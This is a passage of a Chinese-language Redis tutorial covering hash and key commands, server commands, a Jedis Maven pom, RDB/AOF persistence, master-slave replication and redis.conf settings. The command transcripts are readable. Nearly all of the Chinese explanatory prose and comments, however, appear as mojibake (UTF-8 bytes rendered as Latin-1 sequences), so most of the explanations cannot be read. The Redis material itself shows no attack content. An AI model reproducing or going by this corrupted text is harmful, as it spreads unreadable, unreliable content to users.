ä¸­ï¼Œæ‰€æœ‰åŸŸçš„å€¼ã€‚HGETALL key =&gt; è¿”å›æ•£åˆ—é”® key åŒ…å«çš„æ‰€æœ‰åŸŸå€¼å¯¹ã€‚redis&gt; HKEYS message 1) "id"2) "sender"3) "receiver"4) "date"5) "content"redis&gt; HVALS message 1) "10086"2) "peter"3) "jack"4) "2014-8-3 3:25 p.m." 5) "Good morning, jack!"redis&gt; HGETALL message1) "id" #åŸŸ2) "10086" #å€¼3) "sender" #åŸŸ4) "peter" #å€¼5) "receiver"6) "jack"7) "date"8) "2014-8-3 3:25 p.m." 9) "content"10) "Good morning, jack!"================================================================ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿# hset , hget , hgetall127.0.0.1:6379&gt; hset shouji iphone 8(integer) 1127.0.0.1:6379&gt; hset shouji xiaomi 7(integer) 1127.0.0.1:6379&gt; hset shouji huawei p20(integer) 1127.0.0.1:6379&gt; hgetall shouji1) "iphone"2) "8"3) "xiaomi"4) "7"5) "huawei"6) "p20"127.0.0.1:6379&gt; hget shouji huawei"p20"# å–å‡º hash æ•°æ®ä¸­æ‰€æœ‰ fields / values127.0.0.1:6379&gt; hkeys shouji1) "iphone"2) "xiaomi"3) "huawei"127.0.0.1:6379&gt; hvals shouji1) "8"2) "7"3) "p20"# ä¸º hash æ•°æ®ä¸­æŒ‡å®šçš„ä¸€ä¸ª field çš„å€¼è¿›è¡Œå¢å‡127.0.0.1:6379&gt; hincrby shouji xiaomi 10(integer) 17127.0.0.1:6379&gt; hget shouji xiaomi"17"# ä» hash æ•°æ®ä¸­åˆ é™¤ä¸€ä¸ªå­—æ®µ field åŠå…¶å€¼127.0.0.1:6379&gt; HGETALL shouji1) "iphone"2) "8"3) "xiaomi"4) "17"5) "huawei"6) "p20"127.0.0.1:6379&gt; hdel shouji iphone(integer) 1127.0.0.1:6379&gt; HGETALL shouji1) "xiaomi"2) "17"3) "huawei"4) "p20" 3.5.2 æ¡ˆä¾‹: å®ç°è´­ç‰©è½¦ éœ€æ±‚ç‚¹ï¼š åŠ å…¥è´­ç‰©è½¦ æŸ¥è¯¢è´­ç‰©è½¦ ä¿®æ”¹è´­ç‰©è½¦ æ¸…ç©ºè´­ç‰©è½¦ ä»£ç è§ github 3.6 é”®å€¼ç›¸å…³å‘½ä»¤ shellç®€å•å®ç”¨123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101# æŸ¥è¯¢æ‰€æœ‰ cart å¼€å¤´çš„ key127.0.0.1:6379&gt; keys cart*1) "cart:huangbo"2) "cart:xuzheng"3) "cart:wangbaoqiang"# æŸ¥è¯¢æ‰€æœ‰ key127.0.0.1:6379&gt; keys * 1) "bigdata:hadoop" 2) "uniondb" 3) "myset" 4) "cart:huangbo" 5) "bigdata:spark" ..... # åˆ¤æ–­ä¸€ä¸ª key æ˜¯å¦å­˜åœ¨ exists 127.0.0.1:6379&gt; EXISTS bigdata(integer) 1# del åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ª key127.0.0.1:6379&gt; del facevalue(integer) 1# type æŸ¥çœ‹ç±»å‹, ä¾¿äºé’ˆå¯¹ç±»å‹æ“ä½œ127.0.0.1:6379&gt; type bigdataset127.0.0.1:6379&gt; SMEMBERS bigdata1) "hadoop"2) "spark"3) "hive"# expire [key] second è®¾ç½®ä¸€ä¸ª key çš„è¿‡æœŸæ—¶é—´, å•ä½æ˜¯ç§’127.0.0.1:6379&gt; type nameslist127.0.0.1:6379&gt; lrange names 0 -11) "xuzheng"2) "huangbo"3) "ycy"$ 127.0.0.1:6379&gt; expire names 5(integer) 1127.0.0.1:6379&gt; lrange names 0 -11) "xuzheng"2) "huangbo"3) "ycy"$ 127.0.0.1:6379&gt; lrange names 0 -1(empty list or set)# expireat [key] timestamp è®¾ç½®åœ¨æ—¶é—´æˆ³ timestamp è¿‡æœŸ# ttl [key] æŸ¥è¯¢ key çš„æœ‰æ•ˆæ—¶é•¿, ä¸å­˜åœ¨æˆ–æ²¡æœ‰è¶…æ—¶è®¾ç½®, è¿”å› -1127.0.0.1:6379&gt; ttl bigdata(integer) -1# move [key] database å°†å½“å‰åº“ä¸­çš„ key ç§»åŠ¨åˆ°å…¶å®ƒæ•°æ®åº“ä¸­# é»˜è®¤æ˜¯æœ‰16ä¸ª databases 0-15127.0.0.1:6379&gt; move bigdata 2(integer) 1127.0.0.1:6379&gt; type bigdatanone127.0.0.1:6379&gt; SMEMBERS bigdata(empty list or set)127.0.0.1:6379&gt; SELECT 2OK127.0.0.1:6379[2]&gt; keys *1) "bigdata"127.0.0.1:6379[2]&gt; SMEMBERS bigdata1) "hadoop"2) "spark"3) "hive"# ç§»é™¤ç»™å®škey çš„è¿‡æœŸæ—¶é—´127.0.0.1:6379[2]&gt; keys *1) "bigdata"127.0.0.1:6379[2]&gt; expire bigdata 100(integer) 1127.0.0.1:6379[2]&gt; ttl bigdata(integer) 96127.0.0.1:6379[2]&gt; persist bigdata(integer) 1127.0.0.1:6379[2]&gt; ttl bigdata(integer) -1# éšæœºè·å– keyç©ºé—´ä¸­çš„ä¸€ä¸ª127.0.0.1:6379&gt; randomkey"student_tang"# é‡å‘½å key127.0.0.1:6379&gt; zrange yanzhi 0 -11) "wangbaoqiang"2) "xuzheng"3) "huangbo"127.0.0.1:6379&gt; rename yanzhi shuiMaOK127.0.0.1:6379&gt; zrange shuiMa 0 -11) "wangbaoqiang"2) "xuzheng"3) "huangbo"# renamenx [key] newkey å¦‚æœ newkey å­˜åœ¨, åˆ™å¤±è´¥è¿”å›0# type [key] æŸ¥è¯¢ key çš„ç±»å‹ 3.7 æœåŠ¡å™¨ç›¸å…³å‘½ä»¤ ç®€å•æµ‹è¯•12345678910111213141516171819202122232425262728293031# é€‰æ‹©æ•°æ®åº“ (redis é»˜è®¤æ•°æ®åº“ç¼–å· 0-15)127.0.0.1:6379&gt; select 3OK# quité€€å‡º# echo msg å‘ç°ä¸èƒ½æœ‰ç©ºæ ¼127.0.0.1:6379[3]&gt; echo è¦åäº†"\xe8\xa6\x81\xe5\x90\x90\xe4\xba\x86"127.0.0.1:6379[3]&gt; echo iFellSick"iFellSick"# dbsize è¿”å›å½“æœŸé‚£æ•°æ®åº“ä¸­çš„ key çš„æ¡æ•°127.0.0.1:6379[3]&gt; select 0OK127.0.0.1:6379&gt; DBSIZE(integer) 23# flushdb åˆ é™¤å½“å‰é€‰æ‹©æ•°æ®åº“ä¸­çš„æ‰€æœ‰key127.0.0.1:6379[2]&gt; dbsize(integer) 1127.0.0.1:6379[2]&gt; keys *1) "bigdata"127.0.0.1:6379[2]&gt; flushdbOK127.0.0.1:6379[2]&gt; keys *(empty list or set)# flushall åˆ é™¤æ‰€æœ‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰çš„ key 3.8 pom æ–‡ä»¶1234567891011121314151617181920212223242526272829303132&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.rox&lt;/groupId&gt; &lt;artifactId&gt;Redis_Demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt; &lt;artifactId&gt;gson&lt;/artifactId&gt; &lt;version&gt;2.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 5. Redisé«˜å¯ç”¨åœ¨ Redis ä¸­ï¼Œå®ç°é«˜å¯ç”¨çš„æŠ€æœ¯ä¸»è¦åŒ…æ‹¬æŒä¹…åŒ–ã€å¤åˆ¶ã€å“¨å…µå’Œé›†ç¾¤ ç¬¬ä¸€ï¼šæŒä¹…åŒ– æŒä¹…åŒ–æ˜¯æœ€ç®€å•çš„é«˜å¯ç”¨æ–¹æ³•(æœ‰æ—¶ç”šè‡³ä¸è¢«å½’ä¸ºé«˜å¯ç”¨çš„æ‰‹æ®µ)ï¼Œä¸»è¦ä½œç”¨æ˜¯æ•°æ®å¤‡ä»½ï¼Œ å³å°†æ•°æ®å­˜å‚¨åœ¨ç¡¬ç›˜ï¼Œä¿è¯æ•°æ®ä¸ä¼šå› è¿›ç¨‹é€€å‡ºè€Œä¸¢å¤±ã€‚ ç¬¬äºŒï¼šä¸»ä»å¤åˆ¶ å¤åˆ¶æ˜¯é«˜å¯ç”¨ Redis çš„åŸºç¡€ï¼Œå“¨å…µå’Œé›†ç¾¤éƒ½æ˜¯åœ¨å¤åˆ¶åŸºç¡€ä¸Šå®ç°é«˜å¯ç”¨çš„ã€‚å¤åˆ¶ä¸»è¦å®ç° äº†æ•°æ®çš„å¤šæœºå¤‡ä»½ï¼Œä»¥åŠå¯¹äºè¯»æ“ä½œçš„è´Ÿè½½å‡è¡¡å’Œç®€å•çš„æ•…éšœæ¢å¤ã€‚ç¼ºé™·ï¼šæ•…éšœæ¢å¤æ—  æ³•è‡ªåŠ¨åŒ–ï¼›å†™æ“ä½œæ— æ³•è´Ÿè½½å‡è¡¡ï¼›å­˜å‚¨èƒ½åŠ›å—åˆ°å•æœºçš„é™åˆ¶ã€‚ ç¬¬ä¸‰ï¼šå“¨å…µ å“¨å…µåœ¨å¤åˆ¶çš„åŸºç¡€ä¸Šï¼Œå“¨å…µå®ç°äº†è‡ªåŠ¨åŒ–çš„æ•…éšœæ¢å¤ã€‚ç¼ºé™·ï¼šå†™æ“ä½œæ— æ³•è´Ÿè½½å‡è¡¡ï¼›å­˜ å‚¨èƒ½åŠ›å—åˆ°å•æœºçš„é™åˆ¶ã€‚ ç¬¬å››ï¼šé›†ç¾¤ é€šè¿‡é›†ç¾¤ï¼ŒRedis è§£å†³äº†å†™æ“ä½œæ— æ³•è´Ÿè½½å‡è¡¡ï¼Œä»¥åŠå­˜å‚¨èƒ½åŠ›å—åˆ°å•æœºé™åˆ¶çš„é—®é¢˜ï¼Œå®ç° äº†è¾ƒä¸ºå®Œå–„çš„é«˜å¯ç”¨æ–¹æ¡ˆã€‚ 5.1 Redis æŒä¹…åŒ–Redis æŒä¹…åŒ–åˆ†ä¸º RDB æŒä¹…åŒ–å’Œ AOF æŒä¹…åŒ–ï¼š RDBï¼šå°†å½“å‰æ•°æ®ä¿å­˜åˆ°ç¡¬ç›˜ AOFï¼šå°†æ¯æ¬¡æ‰§è¡Œçš„å†™å‘½ä»¤ä¿å­˜åˆ°ç¡¬ç›˜ï¼ˆç±»ä¼¼äº MySQL çš„ binlogï¼‰ ç”±äº AOF æŒä¹…åŒ–çš„å®æ—¶æ€§æ›´å¥½ï¼Œå³å½“è¿›ç¨‹æ„å¤–é€€å‡ºæ—¶ä¸¢å¤±çš„æ•°æ®æ›´å°‘ï¼Œå› æ­¤ AOF æ˜¯ç›®å‰ä¸» æµçš„æŒä¹…åŒ–æ–¹å¼ï¼Œä¸è¿‡ RDB æŒä¹…åŒ–ä»ç„¶æœ‰å…¶ç”¨æ­¦ä¹‹åœ°ã€‚ 5.1.1 RDB æ‰‹åŠ¨æ–¹å¼ save save å‘½ä»¤ä¼šé˜»å¡ Redis æœåŠ¡å™¨è¿›ç¨‹ï¼Œç›´åˆ° RDB æ–‡ä»¶åˆ›å»ºå®Œæ¯•ä¸ºæ­¢ bgsave bgsave å‘½ä»¤ä¼šåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œç”±å­è¿›ç¨‹æ¥è´Ÿè´£åˆ›å»º RDB æ–‡ä»¶ï¼Œçˆ¶è¿›ç¨‹(å³ Redis ä¸» è¿›ç¨‹)åˆ™ç»§ç»­å¤„ç†è¯·æ±‚ã€‚ è‡ªåŠ¨è§¦å‘ åœ¨é…ç½®æ–‡ä»¶redis.confä¸­é…ç½® save m n save 900 1 save 300 10 save 60 10000 #900 ç§’å†…å¦‚æœè¶…è¿‡ 1 ä¸ª key è¢«ä¿®æ”¹ï¼Œåˆ™å‘èµ·å¿«ç…§ä¿å­˜ #300 ç§’å†…å®¹å¦‚è¶…è¿‡ 10 ä¸ª key è¢«ä¿®æ”¹ï¼Œåˆ™å‘èµ·å¿«ç…§ä¿å­˜ #60 ç§’å†…å®¹å¦‚è¶…è¿‡ 10000 ä¸ª key è¢«ä¿®æ”¹ï¼Œåˆ™å‘èµ·å¿«ç…§ä¿å­˜ 5.1.2 AOF æ–¹å¼AOF æ¯”å¿«ç…§æ–¹å¼æœ‰æ›´å¥½çš„æŒä¹…åŒ–æ€§ï¼Œæ˜¯ç”±äºåœ¨ä½¿ç”¨ AOF æŒä¹…åŒ–æ–¹å¼æ—¶ï¼ŒRedis ä¼šå°†æ¯ä¸€ä¸ªæ”¶ åˆ°çš„å†™å‘½ä»¤éƒ½é€šè¿‡ write å‡½æ•°è¿½åŠ åˆ°æ–‡ä»¶ä¸­(é»˜è®¤æ˜¯ appendonly.aof)ã€‚å½“ Redis é‡å¯æ—¶ä¼šé€šè¿‡ é‡æ–°æ‰§è¡Œæ–‡ä»¶ä¸­ä¿å­˜çš„å†™å‘½ä»¤æ¥åœ¨å†…å­˜ä¸­é‡å»ºæ•´ä¸ªæ•°æ®åº“çš„å†…å®¹ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶å‘Šè¯‰ redis æˆ‘ä»¬æƒ³è¦ é€šè¿‡ fsync å‡½æ•°å¼ºåˆ¶ os å†™å…¥åˆ°ç£ç›˜çš„æ—¶æœºã€‚ ä¸‰ç§æ–¹å¼å¦‚ä¸‹ï¼ˆé»˜è®¤æ˜¯ï¼šæ¯ç§’ fsync ä¸€æ¬¡ï¼‰ï¼š 5.2 Redis ä¸»ä»å¤åˆ¶Redis ä¸»ä»å¤åˆ¶é…ç½®å’Œä½¿ç”¨éƒ½éå¸¸ç®€å•ã€‚é€šè¿‡ä¸»ä»å¤åˆ¶å¯ä»¥å…è®¸å¤šä¸ª slave server æ‹¥æœ‰å’Œ master server ç›¸åŒçš„æ•°æ®åº“å‰¯æœ¬ã€‚ä¸‹é¢æ˜¯å…³äº redis ä¸»ä»å¤åˆ¶çš„ä¸€äº›ç‰¹ç‚¹ï¼š 1ã€master å¯ä»¥æœ‰å¤šä¸ª slave 2ã€é™¤äº†å¤šä¸ª slave è¿åˆ°ç›¸åŒçš„ master å¤–ï¼Œslave ä¹Ÿå¯ä»¥è¿æ¥å…¶ä»– slave å½¢æˆå›¾çŠ¶ç»“æ„ 3ã€ä¸»ä»å¤åˆ¶ä¸ä¼šé˜»å¡ masterã€‚ä¹Ÿå°±æ˜¯è¯´å½“ä¸€ä¸ªæˆ–å¤šä¸ª slave ä¸ master è¿›è¡Œåˆæ¬¡åŒæ­¥æ•°æ®æ—¶ï¼Œ master å¯ä»¥ç»§ç»­å¤„ç† client å‘æ¥çš„è¯·æ±‚ã€‚ç›¸å slave åœ¨åˆæ¬¡åŒæ­¥æ•°æ®æ—¶åˆ™ä¼šé˜»å¡ä¸èƒ½å¤„ç† client çš„è¯·æ±‚ã€‚ 4ã€ä¸»ä»å¤åˆ¶å¯ä»¥ç”¨æ¥æé«˜ç³»ç»Ÿçš„å¯ä¼¸ç¼©æ€§,æˆ‘ä»¬å¯ä»¥ç”¨å¤šä¸ª slave ä¸“é—¨ç”¨äº client çš„è¯»è¯·æ±‚ï¼Œ æ¯”å¦‚ sort æ“ä½œå¯ä»¥ä½¿ç”¨ slave æ¥å¤„ç†ã€‚ä¹Ÿå¯ä»¥ç”¨æ¥åšç®€å•çš„æ•°æ®å†—ä½™ 5ã€å¯ä»¥åœ¨ master ç¦ç”¨æ•°æ®æŒä¹…åŒ–ï¼Œåªéœ€è¦æ³¨é‡Šæ‰ master é…ç½®æ–‡ä»¶ä¸­çš„æ‰€æœ‰ save é…ç½®ï¼Œç„¶ ååªåœ¨ slave ä¸Šé…ç½®æ•°æ®æŒä¹…åŒ–ã€‚ ä¸»ä»å¤åˆ¶çš„è¿‡ç¨‹å½“è®¾ç½®å¥½ slave æœåŠ¡å™¨åï¼Œslave ä¼šå»ºç«‹å’Œ master çš„è¿æ¥ï¼Œç„¶åå‘é€ sync å‘½ä»¤ã€‚ æ— è®ºæ˜¯ç¬¬ä¸€ æ¬¡åŒæ­¥å»ºç«‹çš„è¿æ¥è¿˜æ˜¯è¿æ¥æ–­å¼€åçš„é‡æ–°è¿æ¥ï¼Œmaster éƒ½ä¼šå¯åŠ¨(fork)ä¸€ä¸ªåå°è¿›ç¨‹ï¼Œå°†æ•° æ®åº“å¿«ç…§ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼ˆfork ä¸€ä¸ªè¿›ç¨‹å…¥å†…åœ¨ä¹Ÿè¢«å¤åˆ¶äº†ï¼Œå³å†…å­˜ä¼šæ˜¯åŸæ¥çš„ä¸¤å€ï¼‰ï¼ŒåŒæ—¶ master ä¸»è¿›ç¨‹ä¼šå¼€å§‹æ”¶é›†æ–°çš„å†™å‘½ä»¤å¹¶ç¼“å­˜èµ·æ¥ã€‚ åå°è¿›ç¨‹å®Œæˆå†™æ–‡ä»¶åï¼Œmaster å°±å‘é€ æ–‡ä»¶ç»™ slaveï¼Œslave å°†æ–‡ä»¶ä¿å­˜åˆ°ç£ç›˜ä¸Šï¼Œç„¶ååŠ è½½åˆ°å†…å­˜æ¢å¤æ•°æ®åº“å¿«ç…§åˆ° slave ä¸Šã€‚ æ¥ç€ master å°±ä¼šæŠŠç¼“å­˜çš„å‘½ä»¤è½¬å‘ç»™ slaveã€‚ è€Œä¸”åç»­ master æ”¶åˆ°çš„å†™å‘½ä»¤éƒ½ä¼šé€šè¿‡å¼€å§‹å»ºç«‹ çš„è¿æ¥å‘é€ç»™ slaveã€‚ ä» master åˆ° slave çš„åŒæ­¥æ•°æ®çš„å‘½ä»¤å’Œä» client å‘é€çš„å‘½ä»¤ä½¿ç”¨ç›¸åŒçš„ åè®®æ ¼å¼ã€‚ å½“ master å’Œ slave çš„è¿æ¥æ–­å¼€æ—¶ slave å¯ä»¥è‡ªåŠ¨é‡æ–°å»ºç«‹è¿æ¥ã€‚ å¦‚æœ master åŒæ—¶ æ”¶åˆ°å¤šä¸ª slave å‘æ¥çš„åŒæ­¥è¿æ¥å‘½ä»¤ï¼Œåªä¼šä½¿ç”¨å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹æ¥å†™æ•°æ®åº“é•œåƒï¼Œç„¶åå‘é€ç»™ æ‰€æœ‰ slaveã€‚ é…ç½® slave æœåŠ¡å™¨åªéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­åŠ å…¥å¦‚ä¸‹é…ç½®ï¼š slaveof cs1 6379 #æŒ‡å®š master çš„ ip å’Œç«¯å£ æ³¨æ„ï¼šä¸»èŠ‚ç‚¹ä¸ç”¨åŠ ï¼ï¼ï¼ 6.Redis.confé…ç½®æ–‡ä»¶å‚æ•°è¯´æ˜redis.conf é…ç½®é¡¹è¯´æ˜å¦‚ä¸‹ï¼š 1ã€Redis é»˜è®¤ä¸æ˜¯ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œï¼Œå¯ä»¥é€šè¿‡è¯¥é…ç½®é¡¹ä¿®æ”¹ï¼Œä½¿ç”¨ yes å¯ç”¨å®ˆæŠ¤è¿› ç¨‹ daemonize no 2ã€å½“ Redis ä»¥å®ˆæŠ¤è¿›ç¨‹æ–¹å¼è¿è¡Œæ—¶ï¼ŒRedis é»˜è®¤ä¼šæŠŠ pid å†™å…¥/var/run/redis.pid æ–‡ä»¶ï¼Œå¯ä»¥ é€šè¿‡ pidfile æŒ‡å®š pidfile /var/run/redis.pid 3ã€æŒ‡å®š Redis ç›‘å¬ç«¯å£ï¼Œé»˜è®¤ç«¯å£ä¸º 6379ï¼Œä½œè€…åœ¨è‡ªå·±çš„ä¸€ç¯‡åšæ–‡ä¸­è§£é‡Šäº†ä¸ºä»€ä¹ˆé€‰ç”¨ 6379 ä½œä¸ºé»˜è®¤ç«¯å£ï¼Œå› ä¸º 6379 åœ¨æ‰‹æœºæŒ‰é”®ä¸Š MERZ å¯¹åº”çš„å·ç ï¼Œè€Œ MERZ å–è‡ªæ„å¤§åˆ©æ­Œ å¥³ Alessia Merz çš„åå­— port 6379 4ã€ç»‘å®šçš„ä¸»æœºåœ°å€ bind 127.0.0.1 5ã€å½“å®¢æˆ·ç«¯é—²ç½®å¤šé•¿æ—¶é—´åå…³é—­è¿æ¥ï¼Œå¦‚æœæŒ‡å®šä¸º 0ï¼Œè¡¨ç¤ºå…³é—­è¯¥åŠŸèƒ½ timeout 300 6ã€æŒ‡å®šæ—¥å¿—è®°å½•çº§åˆ«ï¼ŒRedis æ€»å…±æ”¯æŒå››ä¸ªçº§åˆ«ï¼šdebugã€verboseã€noticeã€warningï¼Œé»˜ è®¤ä¸º verbose loglevel verbose 7ã€æ—¥å¿—è®°å½•æ–¹å¼ï¼Œé»˜è®¤ä¸ºæ ‡å‡†è¾“å‡ºï¼Œå¦‚æœé…ç½® Redis ä¸ºå®ˆæŠ¤è¿›ç¨‹æ–¹å¼è¿è¡Œï¼Œè€Œè¿™é‡Œåˆé… ç½®ä¸ºæ—¥å¿—è®°å½•æ–¹å¼ä¸ºæ ‡å‡†è¾“å‡ºï¼Œåˆ™æ—¥å¿—å°†ä¼šå‘é€ç»™/dev/null logfile stdout 8ã€è®¾ç½®æ•°æ®åº“çš„æ•°é‡ï¼Œé»˜è®¤æ•°æ®åº“ä¸º 0ï¼Œå¯ä»¥ä½¿ç”¨ SELECT å‘½ä»¤åœ¨è¿æ¥ä¸ŠæŒ‡å®šæ•°æ® åº“ id databases 16 9ã€æŒ‡å®šåœ¨å¤šé•¿æ—¶é—´å†…ï¼Œæœ‰å¤šå°‘æ¬¡æ›´æ–°æ“ä½œï¼Œå°±å°†æ•°æ®åŒæ­¥åˆ°æ•°æ®æ–‡ä»¶ï¼Œå¯ä»¥å¤šä¸ªæ¡ä»¶é… åˆ save \&lt;seconds> \&lt;changes> Redis é»˜è®¤é…ç½®æ–‡ä»¶ä¸­æä¾›äº†ä¸‰ä¸ªæ¡ä»¶ï¼š save 900 1 save 300 10 save 60 10000 åˆ†åˆ«è¡¨ç¤º 900 ç§’ï¼ˆ15 åˆ†é’Ÿï¼‰å†…æœ‰ 1 ä¸ªæ›´æ”¹ï¼Œ300 ç§’ï¼ˆ5 åˆ†é’Ÿï¼‰å†…æœ‰ 10 ä¸ªæ›´æ”¹ä»¥åŠ 60 ç§’ å†…æœ‰ 10000 ä¸ªæ›´æ”¹ã€‚ 10ã€æŒ‡å®šå­˜å‚¨è‡³æœ¬åœ°æ•°æ®åº“æ—¶æ˜¯å¦å‹ç¼©æ•°æ®ï¼Œé»˜è®¤ä¸º yesï¼ŒRedis é‡‡ç”¨ LZF å‹ç¼©ï¼Œå¦‚æœä¸ºäº† èŠ‚çœ CPU æ—¶é—´ï¼Œå¯ä»¥å…³é—­è¯¥é€‰é¡¹ï¼Œä½†ä¼šå¯¼è‡´æ•°æ®åº“æ–‡ä»¶å˜çš„å·¨å¤§ rdbcompression yes 11ã€æŒ‡å®šæœ¬åœ°æ•°æ®åº“æ–‡ä»¶åï¼Œé»˜è®¤å€¼ä¸º dump.rdb dbfilename dump.rdb 12ã€æŒ‡å®šæœ¬åœ°æ•°æ®åº“å­˜æ”¾ç›®å½• dir ./ 13ã€è®¾ç½®å½“æœ¬æœºä¸º slave æœåŠ¡æ—¶ï¼Œè®¾ç½® master æœåŠ¡çš„ IP åœ°å€åŠç«¯å£ï¼Œåœ¨ Redis å¯åŠ¨æ—¶ï¼Œå®ƒ ä¼šè‡ªåŠ¨ä» master è¿›è¡Œæ•°æ®åŒæ­¥ slaveof \&lt;masterip> \&lt;masterport> 14ã€å½“ master æœåŠ¡è®¾ç½®äº†å¯†ç ä¿æŠ¤æ—¶ï¼Œslav æœåŠ¡è¿æ¥ master çš„å¯†ç  masterauth \&lt;master-password> 15ã€è®¾ç½® Redis è¿æ¥å¯†ç ï¼Œå¦‚æœé…ç½®äº†è¿æ¥å¯†ç ï¼Œå®¢æˆ·ç«¯åœ¨è¿æ¥ Redis æ—¶éœ€è¦é€šè¿‡ AUTH \&lt;password>å‘½ä»¤æä¾›å¯†ç ï¼Œé»˜è®¤å…³é—­ requirepass foobared 16ã€è®¾ç½®åŒä¸€æ—¶é—´æœ€å¤§å®¢æˆ·ç«¯è¿æ¥æ•°ï¼Œé»˜è®¤æ— é™åˆ¶ï¼ŒRedis å¯ä»¥åŒæ—¶æ‰“å¼€çš„å®¢æˆ·ç«¯è¿æ¥æ•° ä¸º Redis è¿›ç¨‹å¯ä»¥æ‰“å¼€çš„æœ€å¤§æ–‡ä»¶æè¿°ç¬¦æ•°ï¼Œå¦‚æœè®¾ç½® maxclients 0ï¼Œè¡¨ç¤ºä¸ä½œé™åˆ¶ã€‚å½“ å®¢æˆ·ç«¯è¿æ¥æ•°åˆ°è¾¾é™åˆ¶æ—¶ï¼ŒRedis ä¼šå…³é—­æ–°çš„è¿æ¥å¹¶å‘å®¢æˆ·ç«¯è¿”å› max number of clients reached é”™è¯¯ä¿¡æ¯ maxclients 128 17ã€æŒ‡å®š Redis æœ€å¤§å†…å­˜é™åˆ¶ï¼ŒRedis åœ¨å¯åŠ¨æ—¶ä¼šæŠŠæ•°æ®åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè¾¾åˆ°æœ€å¤§å†…å­˜åï¼Œ Redis ä¼šå…ˆå°è¯•æ¸…é™¤å·²åˆ°æœŸæˆ–å³å°†åˆ°æœŸçš„ Keyï¼Œå½“æ­¤æ–¹æ³•å¤„ç† åï¼Œä»ç„¶åˆ°è¾¾æœ€å¤§å†…å­˜è®¾ç½®ï¼Œ å°†æ— æ³•å†è¿›è¡Œå†™å…¥æ“ä½œï¼Œä½†ä»ç„¶å¯ä»¥è¿›è¡Œè¯»å–æ“ä½œã€‚Redis æ–°çš„ vm æœºåˆ¶ï¼Œä¼šæŠŠ Key å­˜æ”¾ å†…å­˜ï¼ŒValue ä¼šå­˜æ”¾åœ¨ swap åŒº maxmemory \&lt;bytes> 18ã€æŒ‡å®šæ˜¯å¦åœ¨æ¯æ¬¡æ›´æ–°æ“ä½œåè¿›è¡Œæ—¥å¿—è®°å½•ï¼ŒRedis åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯å¼‚æ­¥çš„æŠŠæ•°æ®å†™å…¥ ç£ç›˜ï¼Œå¦‚æœä¸å¼€å¯ï¼Œå¯èƒ½ä¼šåœ¨æ–­ç”µæ—¶å¯¼è‡´ä¸€æ®µæ—¶é—´å†…çš„æ•°æ®ä¸¢å¤±ã€‚å› ä¸º redis æœ¬èº«åŒæ­¥æ•° æ®æ–‡ä»¶æ˜¯æŒ‰ä¸Šé¢ save æ¡ä»¶æ¥åŒæ­¥çš„ï¼Œæ‰€ä»¥æœ‰çš„æ•°æ®ä¼šåœ¨ä¸€æ®µæ—¶é—´å†…åªå­˜åœ¨äºå†…å­˜ä¸­ã€‚é»˜ è®¤ä¸º no appendonly no 19ã€æŒ‡å®šæ›´æ–°æ—¥å¿—æ–‡ä»¶åï¼Œé»˜è®¤ä¸º appendonly.aof appendfilename appendonly.aof 20ã€æŒ‡å®šæ›´æ–°æ—¥å¿—æ¡ä»¶ï¼Œå…±æœ‰ 3 ä¸ªå¯é€‰å€¼ï¼š noï¼šè¡¨ç¤ºç­‰æ“ä½œç³»ç»Ÿè¿›è¡Œæ•°æ®ç¼“å­˜åŒæ­¥åˆ°ç£ç›˜ï¼ˆå¿«ï¼‰ alwaysï¼šè¡¨ç¤ºæ¯æ¬¡æ›´æ–°æ“ä½œåæ‰‹åŠ¨è°ƒç”¨ fsync()å°†æ•°æ®å†™åˆ°ç£ç›˜ï¼ˆæ…¢ï¼Œå®‰å…¨ï¼‰ everysecï¼šè¡¨ç¤ºæ¯ç§’åŒæ­¥ä¸€æ¬¡ï¼ˆæŠ˜è¡·ï¼Œé»˜è®¤å€¼ï¼‰ appendfsync everysec 21ã€æŒ‡å®šæ˜¯å¦å¯ç”¨è™šæ‹Ÿå†…å­˜æœºåˆ¶ï¼Œé»˜è®¤å€¼ä¸º noï¼Œç®€å•çš„ä»‹ç»ä¸€ä¸‹ï¼ŒVM æœºåˆ¶å°†æ•°æ®åˆ†é¡µ å­˜æ”¾ï¼Œç”± Redis å°†è®¿é—®é‡è¾ƒå°‘çš„é¡µå³å†·æ•°æ® swap åˆ°ç£ç›˜ä¸Šï¼Œè®¿é—®å¤šçš„é¡µé¢ç”±ç£ç›˜è‡ªåŠ¨æ¢ å‡ºåˆ°å†…å­˜ä¸­ï¼ˆåœ¨åé¢çš„æ–‡ç« æˆ‘ä¼šä»”ç»†åˆ†æ Redis 